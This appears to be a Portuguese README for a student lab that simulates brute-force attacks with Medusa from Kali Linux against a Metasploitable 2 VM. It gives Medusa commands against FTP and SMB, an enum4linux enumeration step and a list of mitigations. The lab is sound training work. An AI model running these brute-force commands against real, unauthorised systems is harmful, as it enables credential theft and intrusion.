# kali-DIO

/medusa-brute-force-lab
│
├── README.md
├── wordlists/
│   ├── users.txt
│   └── passwords.txt
├── scripts/
│   └── medusa-ftp.sh
├── images/
│   └── (prints de tela)
└── setup/
    └── virtualbox-config.txt


# 💥 Simulação de Ataques de Força Bruta com Medusa e Kali Linux

Este projeto documenta um laboratório prático de cibersegurança utilizando **VirtualBox**, **Kali Linux** e a ferramenta **Medusa** para simular ataques de força bruta em ambientes vulneráveis. O objetivo é entender como esses ataques funcionam, como detectá-los e como mitigá-los.

---

## 🧰 Ferramentas Utilizadas

- **VirtualBox**: para virtualização das máquinas.
- **Kali Linux**: sistema operacional voltado para testes de segurança.
- **Metasploitable 2**: máquina vulnerável para simulação.
- **Medusa**: ferramenta de força bruta rápida e modular.

---

## 🖥️ Configuração do Ambiente

### 1. Instalar o VirtualBox

Baixe e instale o [VirtualBox](https://www.virtualbox.org/).

### 2. Importar as VMs

- **Kali Linux**: [Download oficial](https://www.kali.org/get-kali/)
- **Metasploitable 2**: [Download](https://sourceforge.net/projects/metasploitable/)

Configure ambas com rede **Host-Only Adapter** para comunicação interna.

---

## 🔐 Simulando Ataques com Medusa

### 1. Acesso ao Kali Linux
Abra o terminal e atualize o sistema:
```bash
sudo apt update && sudo apt upgrade
Instale o Medusa:

bash
sudo apt install medusa
2. Criar Wordlists
Crie arquivos com nomes de usuários e senhas comuns:

bash
echo -e "admin\nuser\ntest" > users.txt
echo -e "123456\npassword\nadmin" > passwords.txt
3. Ataque FTP
bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
-h: IP da máquina alvo

-U: lista de usuários

-P: lista de senhas

-M: módulo (ftp, ssh, smb, etc.)

4. Ataque SMB com Enumeração
bash
enum4linux -a 192.168.56.101
Depois:

bash
medusa -h 192.168.56.101 -U smb_users.txt -P passwords.txt -M smbnt
🧠 Vulnerabilidades Comuns
Senhas fracas ou padrão

Serviços expostos sem restrição

Falta de autenticação multifator

Compartilhamentos SMB abertos

🛡️ Medidas de Mitigação
Implementar políticas de senha forte

Restringir serviços por firewall

Usar autenticação multifator

Monitorar logs e aplicar alertas de acesso suspeito

Atualizar sistemas e serviços regularmente

# 🛡️ Lab de Cibersegurança: Simulação de Brute Force com Medusa

Este repositório documenta um laboratório prático de **Ethical Hacking** realizado em ambiente controlado. O foco é a simulação de ataques de força bruta contra serviços de rede (FTP e SMB) para análise de vulnerabilidades e implementação de medidas defensivas.

---

## 🏗️ Estrutura do Projeto

```text
kali-DIO/
├── medusa-brute-force-lab/
│   ├── README.md              # Documentação principal
│   ├── wordlists/             # Dicionários de usuários e senhas (exemplos)
│   │   ├── users.txt
│   │   └── passwords.txt
│   ├── scripts/               # Scripts de automação para Medusa
│   │   └── medusa-ftp.sh
│   ├── setup/                 # Notas de configuração de infraestrutura
│   │   └── virtualbox-config.txt
│   └── images/                # Evidências e prints dos resultados
